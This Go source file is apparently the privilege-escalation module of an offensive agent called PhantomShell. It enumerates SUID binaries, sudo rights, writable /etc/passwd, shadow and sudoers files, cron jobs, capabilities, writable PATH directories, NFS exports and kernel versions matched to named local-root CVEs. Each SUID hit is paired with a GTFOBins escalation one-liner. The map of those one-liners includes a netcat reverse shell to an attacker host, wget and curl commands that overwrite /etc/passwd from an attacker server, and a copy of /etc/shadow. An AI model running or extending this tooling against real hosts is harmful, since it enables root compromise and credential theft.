package modules

import (
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

// GTFOBins top 50 SUID binaries that can be abused for privilege escalation.
var gtfobins = map[string]string{
	"bash":       "bash -p",
	"sh":         "sh -p",
	"dash":       "dash -p",
	"csh":        "csh -b",
	"zsh":        "zsh",
	"ksh":        "ksh -p",
	"env":        "env /bin/sh -p",
	"find":       "find . -exec /bin/sh -p \\;",
	"nmap":       "nmap --interactive -> !sh",
	"vim":        "vim -c ':!sh'",
	"vi":         "vi -c ':!sh'",
	"nano":       "nano -> ^R^X -> reset; sh 1>&0 2>&0",
	"less":       "less /etc/passwd -> !sh",
	"more":       "more /etc/passwd -> !sh",
	"man":        "man man -> !sh",
	"awk":        "awk 'BEGIN {system(\"/bin/sh\")}'",
	"perl":       "perl -e 'exec \"/bin/sh\"'",
	"python":     "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
	"python3":    "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
	"ruby":       "ruby -e 'exec \"/bin/sh\"'",
	"lua":        "lua -e 'os.execute(\"/bin/sh\")'",
	"php":        "php -r 'system(\"/bin/sh\");'",
	"node":       "node -e 'require(\"child_process\").spawn(\"/bin/sh\",...)'",
	"tar":        "tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh",
	"zip":        "zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/sh'",
	"gcc":        "gcc -wrapper /bin/sh,-s .",
	"make":       "COMMAND='/bin/sh' make -s --eval=$'x:\\n\\t-$(COMMAND)'",
	"docker":     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
	"strace":     "strace -o /dev/null /bin/sh",
	"ltrace":     "ltrace -b -L /bin/sh",
	"cp":         "cp /bin/sh /tmp/sh && chmod +s /tmp/sh",
	"mv":         "overwrite /etc/passwd",
	"wget":       "wget http://attacker/passwd -O /etc/passwd",
	"curl":       "curl http://attacker/passwd -o /etc/passwd",
	"dd":         "dd if=/etc/shadow of=/tmp/shadow",
	"tee":        "echo data | tee /etc/passwd",
	"nc":         "nc -e /bin/sh attacker port",
	"socat":      "socat stdin exec:/bin/sh",
	"ssh":        "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
	"scp":        "scp -S /tmp/exploit.sh x y:",
	"rsync":      "rsync -e 'sh -c sh' :x x",
	"git":        "git help status -> !sh",
	"screen":     "screen -> C-a :exec sh",
	"tmux":       "tmux -> :!sh",
	"script":     "script -qc /bin/sh /dev/null",
	"expect":     "expect -c 'spawn /bin/sh;interact'",
	"taskset":    "taskset 1 /bin/sh -p",
	"time":       "/usr/bin/time /bin/sh",
	"timeout":    "timeout 10 /bin/sh",
	"nice":       "nice /bin/sh -p",
	"ionice":     "ionice /bin/sh -p",
}

// Known kernel CVEs with version patterns
var kernelCVEs = []struct {
	Name     string
	CVE      string
	Versions string // simplified version match pattern
}{
	{"DirtyPipe", "CVE-2022-0847", "5.8"},
	{"DirtyCow", "CVE-2016-5195", "2.6,3.,4."},
	{"GameOver(lay)", "CVE-2023-2640", "5.15,6.2"},
	{"nf_tables", "CVE-2023-32233", "5.1,6."},
	{"PwnKit", "CVE-2021-4034", "polkit"},
	{"Looney Tunables", "CVE-2023-4911", "glibc"},
	{"StackRot", "CVE-2023-3269", "6.1,6.2,6.3,6.4"},
}

func RegisterPrivesc(d *core.Dispatcher, exec *core.Executor) {
	d.Register("privesc", func(args map[string]interface{}) map[string]interface{} {
		if runtime.GOOS != "linux" {
			return map[string]interface{}{"status": "error", "error": "privesc checks only supported on linux"}
		}
		return handlePrivesc(exec)
	})
}

func handlePrivesc(exec *core.Executor) map[string]interface{} {
	findings := make(map[string]interface{})

	// SUID binaries
	suidOut, _, _ := exec.Run("find / -perm -4000 -type f 2>/dev/null", 0)
	var suidFindings []map[string]string
	for _, line := range strings.Split(strings.TrimSpace(suidOut), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.Split(line, "/")
		binName := parts[len(parts)-1]
		if exploit, ok := gtfobins[binName]; ok {
			suidFindings = append(suidFindings, map[string]string{
				"path":    line,
				"binary":  binName,
				"exploit": exploit,
			})
		}
	}
	findings["suid"] = suidFindings

	// Sudo -l
	sudoOut, _, code := exec.Run("sudo -l 2>/dev/null", 0)
	if code == 0 && sudoOut != "" {
		findings["sudo"] = sudoOut
	}

	// Writable sensitive files
	var writable []string
	for _, path := range []string{"/etc/passwd", "/etc/shadow", "/etc/crontab", "/etc/sudoers"} {
		if f, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
			f.Close()
			writable = append(writable, path)
		}
	}
	findings["writable_files"] = writable

	// Cron jobs
	cronOut, _, _ := exec.Run("ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null; cat /etc/crontab 2>/dev/null", 0)
	if cronOut != "" {
		findings["cron"] = cronOut
	}

	// Writable systemd service files
	svcOut, _, _ := exec.Run("find /etc/systemd/system -writable -type f 2>/dev/null", 0)
	if strings.TrimSpace(svcOut) != "" {
		findings["writable_services"] = strings.Split(strings.TrimSpace(svcOut), "\n")
	}

	// Docker group
	groupOut, _, _ := exec.Run("id 2>/dev/null", 0)
	if strings.Contains(groupOut, "docker") {
		findings["docker_group"] = true
	}

	// Kernel version + CVE matching
	kernelOut, _, _ := exec.Run("uname -r 2>/dev/null", 0)
	kernel := strings.TrimSpace(kernelOut)
	findings["kernel"] = kernel

	var cves []map[string]string
	for _, cve := range kernelCVEs {
		for _, ver := range strings.Split(cve.Versions, ",") {
			if strings.Contains(kernel, ver) {
				cves = append(cves, map[string]string{
					"name": cve.Name,
					"cve":  cve.CVE,
				})
				break
			}
		}
	}
	findings["potential_cves"] = cves

	// Capabilities
	capOut, _, _ := exec.Run("getcap -r / 2>/dev/null | head -50", 0)
	if strings.TrimSpace(capOut) != "" {
		findings["capabilities"] = strings.Split(strings.TrimSpace(capOut), "\n")
	}

	// PATH hijacking: writable directories in PATH
	pathEnv := os.Getenv("PATH")
	var hijackable []string
	for _, dir := range strings.Split(pathEnv, ":") {
		if info, err := os.Stat(dir); err == nil {
			// Check if writable by current user
			if info.Mode().Perm()&0002 != 0 { // world-writable
				hijackable = append(hijackable, fmt.Sprintf("%s (world-writable)", dir))
			}
		}
	}
	findings["path_hijack"] = hijackable

	// NFS no_root_squash
	exportsOut, _, _ := exec.Run("cat /etc/exports 2>/dev/null", 0)
	if strings.Contains(exportsOut, "no_root_squash") {
		findings["nfs_nosquash"] = exportsOut
	}

	return map[string]interface{}{"status": "success", "data": findings}
}
